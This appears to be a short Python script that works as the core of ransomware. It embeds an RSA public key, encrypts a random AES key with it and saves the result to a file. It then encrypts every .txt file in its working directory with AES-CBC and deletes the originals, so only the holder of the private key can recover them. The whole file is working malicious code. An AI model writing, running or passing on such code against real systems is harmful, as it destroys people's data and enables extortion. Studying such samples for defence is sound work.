from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad
from Crypto.Cipher import PKCS1_OAEP, AES
import os

public_key_b = b"""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0msOiJwzNiQygj42HzBN
SLg9yKWai/TqVm69C9b0pK1rAZbY5iNOn2JgFjFfRfOVDGllNyLdWeugspi1+bj+
yj4EVnQr3woUFqG5hFdgpXXmfRsEZCT8Ww1Ucp441iyTmJn3KXY3lIFk+oA+9DNo
1ooGu3viXd18fnmB4aw7sWZEvhtT+VusImAbrZgnDAPkyhTrPnjIg0sOVMiOP8oO
BBjCX2UzqFxNltjM69BfzteuTcDML3DEr44fTa7gcCjpz/d8jyexolEFQIIDiWwd
oXCek91nzEJAqBHETYF502YMC9TTiFsMr1wCvM98lXCWb+y1Mq2yveGxH4CQOV3R
lQIDAQAB
-----END PUBLIC KEY-----"""

public_key = RSA.import_key(public_key_b)

shared_key = os.urandom(32)

cipher_rsa = PKCS1_OAEP.new(public_key)
encrypted_key = cipher_rsa.encrypt(shared_key)

with open('EncryptedSharedKey', 'wb') as f:
    f.write(encrypted_key)
    
# aes_key = scrypt(shared_key, salt=os.urandom(16), key_len=32, N=2**14, r=8, p=1)

files = [e for e in os.listdir() if e.endswith('.txt')]

for file in files:
    with open(f'{file}', 'r') as f:
        content = f.read()

    cipher = AES.new(shared_key, AES.MODE_CBC)
    ciphered_data = cipher.encrypt(pad(content.encode('utf-8'), AES.block_size))

    with open(f'{file}.encrypted', 'wb') as f:
        f.write(cipher.iv)
        f.write(ciphered_data)
        
    os.remove(file)
